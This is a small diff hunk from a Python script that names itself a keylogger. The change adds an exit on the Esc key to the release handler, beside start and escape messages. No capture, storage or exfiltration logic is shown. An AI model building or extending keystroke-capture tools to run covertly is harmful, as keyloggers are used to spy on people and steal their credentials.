@@ -20,6 +20,7 @@ def on_press (key):
 def on_release(key):
     if key == keyboard.Key.esc:
         print("\n Escaping the keylogger")
+        return False
 
 print("Keylogger start")
 print("press esc to escape\n")
